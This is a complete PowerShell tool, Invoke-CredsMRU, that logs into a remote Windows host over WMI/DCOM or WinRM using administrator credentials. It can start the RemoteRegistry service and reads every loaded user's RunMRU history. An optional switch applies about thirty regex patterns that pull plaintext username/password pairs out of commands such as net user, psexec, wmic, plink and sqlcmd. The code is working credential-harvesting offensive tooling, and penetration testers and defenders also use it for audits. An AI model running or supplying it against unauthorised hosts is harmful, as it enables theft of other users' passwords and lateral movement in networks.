<#
.SYNOPSIS
    Query MRU-related registry keys on a remote host using either RPC (WMI/CIM) or WinRM.

.DESCRIPTION
    Invoke-CredsMRU allows you to collect MRU-style registry data from a remote Windows host.

    - **Method RPC**  : Uses WMI/CIM (DCOM/RPC) and the `StdRegProv` provider.
                        Optionally starts the RemoteRegistry service on the target and
                        stops it again when finished.

    - **Method WinRM**: Uses PowerShell remoting (WinRM) and reads the registry locally
                        on the remote host via standard PowerShell cmdlets.

    The first version intentionally does not parse or prettify the values – it simply
    writes out the raw objects returned by the underlying APIs so you can inspect them.

.PARAMETER ComputerName
    Remote host to query.

.PARAMETER Method
    Connection method: 'RPC' (WMI/CIM over DCOM/RPC) or 'WinRM' (PowerShell remoting).

.PARAMETER Credential
    Optional credentials that are local admin on the remote host.
    If omitted, the current logon context will be used (for example, the
    currently authenticated domain user running this script).

    Typically obtained via:  $cred = Get-Credential

.PARAMETER ManageRemoteRegistryService
    When using the RPC method, attempt to start the RemoteRegistry service on the
    remote host if it is stopped, and stop it again when the script finishes (only
    if it was originally stopped).

    Ignored when Method is WinRM.

.PARAMETER Authentication
    Authentication method to use for WinRM connections. Default is 'Negotiate'.
    
    Common values:
        - Negotiate: Default, works for domain and workgroup scenarios
        - Kerberos: For domain environments
        - Credssp: For double-hop scenarios (requires additional configuration)
    
    Ignored when Method is RPC.

.PARAMETER ExtractCredentials
    When enabled, searches the MRU Data field for credential patterns using regex.
    Extracts username/password pairs from common command-line tools (net, wmic, psexec, etc.).
    Based on regex patterns from Invoke-FindEventCreds by The-Viper-One.
    See: https://github.com/The-Viper-One/Invoke-FindEventCreds

    NOTE: This script focuses specifically on **per-user MRU data**. It:
        - Reads the MRU of the **current authenticated user** (for WinRM).
        - Enumerates all loaded user SIDs under **HKEY_USERS** and reads their MRU keys.
        - Uses a fixed MRU path relative to each user hive:
              Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU

.EXAMPLE
    $cred = Get-Credential
    .\Invoke-CredsMRU.ps1 -ComputerName target01 -Method RPC -Credential $cred

.EXAMPLE
    $cred = Get-Credential
    .\Invoke-CredsMRU.ps1 -ComputerName target01 -Method WinRM -Credential $cred

.EXAMPLE
    # Extract credentials from MRU data
    $cred = Get-Credential
    .\Invoke-CredsMRU.ps1 -ComputerName target01 -Method RPC -Credential $cred -ExtractCredentials

.NOTES
    Phase 1: raw output only (no regex parsing, no pretty printing).
    Later phases can consume this output and add parsing / reporting logic.
    
    CREDITS:
    Credential extraction regex patterns are based on Invoke-FindEventCreds by The-Viper-One.
    Source: https://github.com/The-Viper-One/Invoke-FindEventCreds
#>

[CmdletBinding()]
param(
    [Parameter(Mandatory = $true)]
    [ValidateNotNullOrEmpty()]
    [string]$ComputerName,

    [Parameter(Mandatory = $true)]
    [ValidateSet('RPC', 'WinRM')]
    [string]$Method,

    [Parameter(Mandatory = $false)]
    [ValidateNotNull()]
    [System.Management.Automation.PSCredential]$Credential,

    [Parameter(Mandatory = $false)]
    [switch]$ManageRemoteRegistryService,

    [Parameter(Mandatory = $false)]
    [ValidateSet('Default', 'Basic', 'Negotiate', 'NegotiateWithImplicitCredential', 'Credssp', 'Digest', 'Kerberos')]
    [string]$Authentication = 'Negotiate',

    [Parameter(Mandatory = $false)]
    [switch]$ExtractCredentials
)

Write-Verbose "Target computer: $ComputerName"
Write-Verbose "Method        : $Method"

# Fixed MRU sub-key relative to each user hive (HKCU / HKU\<SID>)
$script:MruRelativeSubKey = 'Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU'

# Credential extraction regex patterns
# Based on Invoke-FindEventCreds by The-Viper-One
# Source: https://github.com/The-Viper-One/Invoke-FindEventCreds
$script:CredentialPairRegexPatterns = @(
    # ---- Core Windows binaries ----
    'net\s+user\s+(?<username>[^\s]+)\s+(?<password>[^\s]+)',
    'net\s+use\s+\S+\s+(?<password>[^\s]+)\s+/user:(?<username>[^\s]+)',
    'schtasks.+/(?:RU|U)\s+(?<username>[^\s]+).+/(?:RP|P)\s+(?<password>[^\s]+)',
    'wmic.+/user:\s*(?<username>[^\s]+).+/password:\s*(?<password>[^\s]+)',
    'psexec.+-u\s+(?<username>[^\s]+).+-p\s+(?<password>[^\s]+)',
    'cmdkey\s+/(?:add|generic):\S+\s+/user:(?<username>[^\s]+)\s+/pass:(?<password>[^\s]+)',
    'bitsadmin.+/setcredentials\s+\S+\s+(?:SERVER|PROXY)\s+\S+\s+(?<username>[^\s]+)\s+(?<password>[^\s]+)',
    'sc\.exe\s+(?:config|create).+?\bobj=\s*(?<username>[^\s]+)\s+password=\s*(?<password>[^\s]+)',
    # test with Win+R: wmic /node:192.168.1.10 /user:Administrator /password:Secret123 process list brief

    # ---- Installers ----
    'msiexec.+\bUSERNAME=(?<username>[^\s]+).+PASSWORD=(?<password>[^\s]+)',

    # ---- Domain / trust tools ----
    'netdom\s+(?:join|trust)\b[^\r\n]+/userD:(?<username>[^\s]+)\s+/passwordD:(?<password>[^\s]+)',
    'nltest\b[^\r\n]+/user:(?<username>[^\s]+)\s+/password:(?<password>[^\s]+)',

    # ---- PuTTY family (command-line) ----
    'plink\b.*?(?<username>[^\s]+)@[^\s]+\s+-pw\s+(?<password>[^\s]+)',
    'plink\b.*?-u\s+(?<username>[^\s]+).+-pw\s+(?<password>[^\s]+)',
    'pscp\b.*?-pw\s+(?<password>[^\s]+).+?(?<username>[^\s]+)@',
    'psftp\b.*?-pw\s+(?<password>[^\s]+).+?(?<username>[^\s]+)@',
    'putty\b.*?-ssh\s+(?<username>[^\s]+)@[^\s]+\s+-pw\s+(?<password>[^\s]+)',

    # ---- Database CLIs ----
    'sqlcmd\b.+-U\s+(?<username>[^\s]+)\s+-P\s+(?<password>[^\s]+)',
    'osql\b.+-U\s+(?<username>[^\s]+)\s+-P\s+(?<password>[^\s]+)',
    'mysql\b.+-u\s*(?<username>[^\s]+)\s+-p(?<password>[^\s]+)',

    # ---- Web tools ----
    'curl\b.+?-u\s+(?<username>[^:\s]+):(?<password>[^\s]+)',
    'wget\b.+?--user=(?<username>[^\s]+)\s+--password=(?<password>[^\s]+)',

    # ---- Event / cert utilities ----
    'wevtutil\b.+/u:(?<username>[^\s]+)\s+/p:(?<password>[^\s]+)',
    'eventcreate\b.+/u\s+(?<username>[^\s]+)\s+/p\s+(?<password>[^\s]+)',
    'certreq\b.+-username\s+(?<username>[^\s]+)\s+-p(?:assword)?\s+(?<password>[^\s]+)',
    'certutil\b.+-username\s+(?<username>[^\s]+)\s+-p(?:assword)?\s+(?<password>[^\s]+)',

    # ---- VPN / sync ----
    'rasdial\s+\S+\s+(?<username>[^\s]+)\s+(?<password>[^\s]+)',
    'vpncmd\b.+/USER:(?<username>[^\s]+)\s+/PASSWORD:(?<password>[^\s]+)',
    'rsync\b.+--password-file=(?<password>[^\s]+)\s+(?<username>[^\s]+)@',

    # ---- Generic patterns ----
    '(?:(?:-u|--?user(?:name)?)\s+(?<username>[^\s]+))[^\r\n]+?(?:(?:-p|--?pass(?:word)?)\s+(?<password>[^\s]+))',
    '(?:--username=(?<username>[^\s]+))[^\r\n]+?(?:--password=(?<password>[^\s]+))',
    '(?:(?:(?:-u)|(?:-user)|(?:-username)|(?:--user)|(?:--username)|(?:/u)|(?:/USER)|(?:/USERNAME))(?:\s+|:)(?<username>[^\s]+))',
    '(?:(?:(?:-p)|(?:-password)|(?:-passwd)|(?:--password)|(?:--passwd)|(?:/P)|(?:/PASSWD)|(?:/PASS)|(?:/CODE)|(?:/PASSWORD))(?:\s+|:)(?<password>[^\s]+))'
)

function Test-CredentialMatch {
    <#
    .SYNOPSIS
        Tests if a data string matches credential regex patterns.
    
    .DESCRIPTION
        Searches the provided data string against credential regex patterns and returns
        true if credentials are detected, false otherwise.
    
    .PARAMETER Data
        The data string to search for credentials.
    #>
    [CmdletBinding()]
    param(
        [Parameter(Mandatory = $true)]
        [string]$Data
    )

    if ([string]::IsNullOrWhiteSpace($Data)) {
        return $false
    }

    foreach ($RegexPattern in $script:CredentialPairRegexPatterns) {
        if ($Data -match $RegexPattern) {
            if ($Matches['username'] -and $Matches['password']) {
                return $true
            }
        }
    }

    return $false
}

function Invoke-MruViaRpc {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory = $true)]
        [string]$ComputerName,

        [Parameter(Mandatory = $false)]
        [System.Management.Automation.PSCredential]$Credential,

        [Parameter(Mandatory = $false)]
        [switch]$ManageRemoteRegistryService,

        [Parameter(Mandatory = $false)]
        [switch]$ExtractCredentials
    )

    Write-Verbose "Using RPC (CIM/WMI + StdRegProv) to query remote registry."

    $cimSession = $null
    $remoteRegistryService = $null
    $serviceWasRunning = $false

    try {
        $sessionOptions = New-CimSessionOption -Protocol Dcom

        if ($Credential) {
            $cimSession = New-CimSession -ComputerName $ComputerName -Credential $Credential -SessionOption $sessionOptions
        }
        else {
            # Use current logon context
            $cimSession = New-CimSession -ComputerName $ComputerName -SessionOption $sessionOptions
        }

        Write-Verbose "CIM session to '$ComputerName' created (protocol DCOM/RPC)."

        if ($ManageRemoteRegistryService.IsPresent) {
            Write-Verbose "Checking RemoteRegistry service state on '$ComputerName'."

            $remoteRegistryService = Get-CimInstance -ClassName Win32_Service -CimSession $cimSession -Filter "Name='RemoteRegistry'" -ErrorAction SilentlyContinue
            if (-not $remoteRegistryService) {
                Write-Warning "RemoteRegistry service not found on '$ComputerName'."
            }
            else {
                $serviceWasRunning = $remoteRegistryService.State -eq 'Running'
                if (-not $serviceWasRunning) {
                    Write-Verbose "Starting RemoteRegistry service on '$ComputerName'."
                    $startResult = Invoke-CimMethod -InputObject $remoteRegistryService -MethodName StartService
                    if ($startResult.ReturnValue -ne 0) {
                        Write-Warning "Failed to start RemoteRegistry service on '$ComputerName' (ReturnValue=$($startResult.ReturnValue))."
                    }
                    else {
                        Write-Verbose "RemoteRegistry service started on '$ComputerName'."
                    }
                }
                else {
                    Write-Verbose "RemoteRegistry service already running on '$ComputerName'."
                }
            }
        }

        # Enumerate user SIDs under HKEY_USERS and query their MRU keys.
        # Use the decimal value for HKEY_USERS (0x80000003 = 2147483651) to avoid signed-int overflow issues.
        # Doc: https://learn.microsoft.com/en-us/previous-versions/windows/desktop/regprov/getqwordvalue-method-in-class-stdregprov
        $hkeyUsers = [uint32]2147483651 # HKEY_USERS

        Write-Verbose "Enumerating user SIDs under HKEY_USERS on '$ComputerName'."

        $enumSidArgs = @{
            hDefKey     = $hkeyUsers
            sSubKeyName = ''
        }

        $sidResult = Invoke-CimMethod -ClassName StdRegProv -Namespace root\default -CimSession $cimSession -MethodName EnumKey -Arguments $enumSidArgs -ErrorAction Stop

        if (-not $sidResult.sNames) {
            Write-Warning "No user SIDs found under HKEY_USERS on '$ComputerName'."
        }
        else {
            $totalSidsFound = $sidResult.sNames.Count
            Write-Verbose "Total SIDs detected by EnumKey (before filtering): $totalSidsFound"
            
            $sidList = $sidResult.sNames | Where-Object { $_ -match '^S-1-5-21-' }
            Write-Verbose "SIDs matching pattern '^S-1-5-21-': $($sidList.Count)"
            write-Verbose "SID List: $sidList"
            foreach ($sid in $sidList) {
                $subKeyFull = "$sid\$MruRelativeSubKey"
                $displayPath = "HKU\$subKeyFull"

                Write-Verbose "===== [$ComputerName] RPC StdRegProv SID=$sid : $displayPath ====="

                try {
                    $enumArgs = @{
                        hDefKey     = $hkeyUsers
                        sSubKeyName = $subKeyFull
                    }

                    $enumResult = Invoke-CimMethod -ClassName StdRegProv -Namespace root\default -CimSession $cimSession -MethodName EnumValues -Arguments $enumArgs -ErrorAction Stop

                    if (-not $enumResult.sNames) {
                        Write-Warning "No MRU values found (or key does not exist) for '$displayPath'."
                        continue
                    }

                    # For each value, attempt to read its raw data using the appropriate StdRegProv method.
                    for ($i = 0; $i -lt $enumResult.sNames.Count; $i++) {
                        $valueName = $enumResult.sNames[$i]
                        $valueType = $null
                        if ($enumResult.Types -and $enumResult.Types.Count -gt $i) {
                            $valueType = $enumResult.Types[$i]
                        }

                        $data = $null
                        $typeName = $null

                        switch ($valueType) {
                            1 { # REG_SZ
                                $typeName = 'REG_SZ'
                                $valArgs = @{
                                    hDefKey     = $hkeyUsers
                                    sSubKeyName = $subKeyFull
                                    sValueName  = $valueName
                                }
                                $valResult = Invoke-CimMethod -ClassName StdRegProv -Namespace root\default -CimSession $cimSession -MethodName GetStringValue -Arguments $valArgs -ErrorAction SilentlyContinue
                                $data = $valResult.sValue
                            }
                            2 { # REG_EXPAND_SZ
                                $typeName = 'REG_EXPAND_SZ'
                                $valArgs = @{
                                    hDefKey     = $hkeyUsers
                                    sSubKeyName = $subKeyFull
                                    sValueName  = $valueName
                                }
                                $valResult = Invoke-CimMethod -ClassName StdRegProv -Namespace root\default -CimSession $cimSession -MethodName GetExpandedStringValue -Arguments $valArgs -ErrorAction SilentlyContinue
                                $data = $valResult.sValue
                            }
                            3 { # REG_BINARY
                                $typeName = 'REG_BINARY'
                                $valArgs = @{
                                    hDefKey     = $hkeyUsers
                                    sSubKeyName = $subKeyFull
                                    sValueName  = $valueName
                                }
                                $valResult = Invoke-CimMethod -ClassName StdRegProv -Namespace root\default -CimSession $cimSession -MethodName GetBinaryValue -Arguments $valArgs -ErrorAction SilentlyContinue
                                $data = $valResult.uValue
                            }
                            4 { # REG_DWORD
                                $typeName = 'REG_DWORD'
                                $valArgs = @{
                                    hDefKey     = $hkeyUsers
                                    sSubKeyName = $subKeyFull
                                    sValueName  = $valueName
                                }
                                $valResult = Invoke-CimMethod -ClassName StdRegProv -Namespace root\default -CimSession $cimSession -MethodName GetDWORDValue -Arguments $valArgs -ErrorAction SilentlyContinue
                                $data = $valResult.uValue
                            }
                            7 { # REG_MULTI_SZ
                                $typeName = 'REG_MULTI_SZ'
                                $valArgs = @{
                                    hDefKey     = $hkeyUsers
                                    sSubKeyName = $subKeyFull
                                    sValueName  = $valueName
                                }
                                $valResult = Invoke-CimMethod -ClassName StdRegProv -Namespace root\default -CimSession $cimSession -MethodName GetMultiStringValue -Arguments $valArgs -ErrorAction SilentlyContinue
                                $data = $valResult.sValue
                            }
                            11 { # REG_QWORD
                                $typeName = 'REG_QWORD'
                                $valArgs = @{
                                    hDefKey     = $hkeyUsers
                                    sSubKeyName = $subKeyFull
                                    sValueName  = $valueName
                                }
                                $valResult = Invoke-CimMethod -ClassName StdRegProv -Namespace root\default -CimSession $cimSession -MethodName GetQWORDValue -Arguments $valArgs -ErrorAction SilentlyContinue
                                $data = $valResult.uValue
                            }
                            default {
                                $typeName = "UNKNOWN($valueType)"
                                $data = $null
                            }
                        }

                        # Create raw per-value object
                        $resultObject = [pscustomobject]@{
                            ComputerName = $ComputerName
                            Method       = 'RPC'
                            SID          = $sid
                            Path         = $displayPath
                            ValueName    = $valueName
                            ValueType    = $typeName
                            RawTypeCode  = $valueType
                            Data         = $data
                        }

                        # Extract credentials if requested - only show entries that match credential patterns
                        if ($ExtractCredentials.IsPresent -and $data) {
                            $dataString = if ($data -is [string]) { $data } else { $data -join ' ' }
                            if (Test-CredentialMatch -Data $dataString) {
                                # Only output raw data object when credentials are detected
                                $resultObject
                            }
                        }
                        else {
                            # Output all raw data objects when ExtractCredentials is not enabled
                            $resultObject
                        }
                    }
                }
                catch {
                    Write-Warning "Failed to query MRU for SID '$sid' on '$ComputerName' via RPC. $_"
                }
            }
        }
    }
    finally {
        if ($ManageRemoteRegistryService.IsPresent -and $remoteRegistryService) {
            if (-not $serviceWasRunning -and $remoteRegistryService.State -eq 'Running') {
                Write-Verbose "Stopping RemoteRegistry service on '$ComputerName' (it was originally stopped)."
                try {
                    $remoteRegistryService = Get-CimInstance -ClassName Win32_Service -CimSession $cimSession -Filter "Name='RemoteRegistry'" -ErrorAction SilentlyContinue
                    if ($remoteRegistryService) {
                        $stopResult = Invoke-CimMethod -InputObject $remoteRegistryService -MethodName StopService
                        if ($stopResult.ReturnValue -ne 0) {
                            Write-Warning "Failed to stop RemoteRegistry service on '$ComputerName' (ReturnValue=$($stopResult.ReturnValue))."
                        }
                    }
                }
                catch {
                    Write-Warning "Error while trying to stop RemoteRegistry service on '$ComputerName'. $_"
                }
            }
        }

        if ($cimSession) {
            Write-Verbose "Removing CIM session to '$ComputerName'."
            Remove-CimSession -CimSession $cimSession
        }
    }
}

function Invoke-MruViaWinRM {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory = $true)]
        [string]$ComputerName,

        [Parameter(Mandatory = $false)]
        [System.Management.Automation.PSCredential]$Credential,

        [Parameter(Mandatory = $false)]
        [string]$Authentication = 'Negotiate',

        [Parameter(Mandatory = $false)]
        [switch]$ExtractCredentials
    )

    Write-Verbose "Using WinRM (PowerShell remoting) to query remote registry."

    $scriptBlock = {
        param(
            [string]$MruRelativeSubKey,
            [bool]$ExtractCredentials,
            [string[]]$CredentialPatterns
        )

        $baseSubKey = $MruRelativeSubKey

        # 1. Current authenticated user (HKCU)
        try {
            $currentSid = [System.Security.Principal.WindowsIdentity]::GetCurrent().User.Value
        }
        catch {
            $currentSid = $null
        }

        $hkcuPath = "HKCU:\$baseSubKey"
        Write-Verbose "===== [$env:COMPUTERNAME] WinRM HKCU (CurrentUser SID=$currentSid) : $hkcuPath ====="

        if (Test-Path -Path $hkcuPath) {
            try {
                $hkcuProperties = Get-ItemProperty -Path $hkcuPath

                # Extract credentials if requested
                if ($ExtractCredentials) {
                    foreach ($prop in $hkcuProperties.PSObject.Properties) {
                        if ($prop.Name -notin @('PSPath', 'PSParentPath', 'PSChildName', 'PSDrive', 'PSProvider')) {
                            $propValue = $prop.Value
                            if ($propValue) {
                                $dataString = if ($propValue -is [string]) { $propValue } elseif ($propValue -is [array]) { $propValue -join ' ' } else { $propValue.ToString() }
                                
                                # Check if credentials match any pattern
                                $hasCredentials = $false
                                foreach ($pattern in $CredentialPatterns) {
                                    if ($dataString -match $pattern) {
                                        if ($Matches['username'] -and $Matches['password']) {
                                            $hasCredentials = $true
                                            break
                                        }
                                    }
                                }
                                
                                # Output raw data object if credentials found
                                if ($hasCredentials) {
                                    [pscustomobject]@{
                                        ComputerName = $env:COMPUTERNAME
                                        Method       = 'WinRM'
                                        SID          = $currentSid
                                        Path         = $hkcuPath
                                        ValueName    = $prop.Name
                                        ValueType    = 'REG_SZ'
                                        Data         = $propValue
                                    }
                                }
                            }
                        }
                    }
                }
                else {
                    # Raw output: full item and properties, no parsing
                    Get-Item -Path $hkcuPath | Format-List * -Force
                    $hkcuProperties | Format-List * -Force
                }
            }
            catch {
                Write-Warning "Failed to read '$hkcuPath' via WinRM. $_"
            }
        }
        else {
            Write-Warning "MRU path '$hkcuPath' does not exist for current user."
        }

        # 2. All loaded user SIDs under HKEY_USERS
        $hkuRoot = 'Registry::HKEY_USERS'
        Write-Verbose "===== [$env:COMPUTERNAME] WinRM HKU user SIDs : $hkuRoot\$baseSubKey ====="

        try {
            $sidKeys = Get-ChildItem -Path $hkuRoot -ErrorAction SilentlyContinue | Where-Object { $_.PSChildName -match '^S-1-5-21-' }
        }
        catch {
            Write-Warning "Failed to enumerate HKEY_USERS on remote host. $_"
            return
        }

        foreach ($sidKey in $sidKeys) {
            $sid = $sidKey.PSChildName
            $path = "Registry::HKEY_USERS\$sid\$baseSubKey"

            Write-Verbose "----- SID=$sid MRU path: $path -----"

            if (-not (Test-Path -Path $path)) {
                Write-Warning "MRU path '$path' does not exist for SID '$sid'."
                continue
            }

            try {
                $properties = Get-ItemProperty -Path $path

                # Extract credentials if requested
                if ($ExtractCredentials) {
                    foreach ($prop in $properties.PSObject.Properties) {
                        if ($prop.Name -notin @('PSPath', 'PSParentPath', 'PSChildName', 'PSDrive', 'PSProvider')) {
                            $propValue = $prop.Value
                            if ($propValue) {
                                $dataString = if ($propValue -is [string]) { $propValue } elseif ($propValue -is [array]) { $propValue -join ' ' } else { $propValue.ToString() }
                                
                                # Check if credentials match any pattern
                                $hasCredentials = $false
                                foreach ($pattern in $CredentialPatterns) {
                                    if ($dataString -match $pattern) {
                                        if ($Matches['username'] -and $Matches['password']) {
                                            $hasCredentials = $true
                                            break
                                        }
                                    }
                                }
                                
                                # Output raw data object if credentials found
                                if ($hasCredentials) {
                                    [pscustomobject]@{
                                        ComputerName = $env:COMPUTERNAME
                                        Method       = 'WinRM'
                                        SID          = $sid
                                        Path         = $path
                                        ValueName    = $prop.Name
                                        ValueType    = 'REG_SZ'
                                        Data         = $propValue
                                    }
                                }
                            }
                        }
                    }
                }
                else {
                    # Raw output: full item and properties, no parsing
                    Get-Item -Path $path | Format-List * -Force
                    $properties | Format-List * -Force
                }
            }
            catch {
                Write-Warning "Failed to read '$path' via WinRM. $_"
            }
        }
    }

    # If the target is the local machine, run the script block locally instead of via WinRM
    $isLocal =
        ($ComputerName -eq 'localhost') -or
        ($ComputerName -eq '127.0.0.1') -or
        ($ComputerName -eq '.') -or
        ($ComputerName -ieq $env:COMPUTERNAME)

    if ($isLocal) {
        Write-Verbose "Target '$ComputerName' detected as local machine; executing MRU query script block locally (no WinRM)."
        & $scriptBlock $MruRelativeSubKey $ExtractCredentials.IsPresent $script:CredentialPairRegexPatterns
        return
    }

    # Remote host: use WinRM / Invoke-Command
    $invokeParams = @{
        ComputerName   = $ComputerName
        ScriptBlock    = $scriptBlock
        ArgumentList   = @($MruRelativeSubKey, $ExtractCredentials.IsPresent, $script:CredentialPairRegexPatterns)
        Authentication = $Authentication
        ErrorAction    = 'Stop'
    }

    if ($Credential) {
        $invokeParams['Credential'] = $Credential
    }

    try {
        Write-Verbose "Connecting to '$ComputerName' via WinRM using authentication method '$Authentication'."
        Invoke-Command @invokeParams
    }
    catch {
        $errorMsg = $_.Exception.Message
        throw "Failed to connect to '$ComputerName' via WinRM: $errorMsg"
    }
}

switch ($Method.ToUpperInvariant()) {
    'RPC' {
        Invoke-MruViaRpc -ComputerName $ComputerName -Credential $Credential -ManageRemoteRegistryService:$ManageRemoteRegistryService -ExtractCredentials:$ExtractCredentials
    }
    'WINRM' {
        Invoke-MruViaWinRM -ComputerName $ComputerName -Credential $Credential -Authentication $Authentication -ExtractCredentials:$ExtractCredentials
    }
    default {
        throw "Unsupported method '$Method'. Valid values are: RPC, WinRM."
    }
}

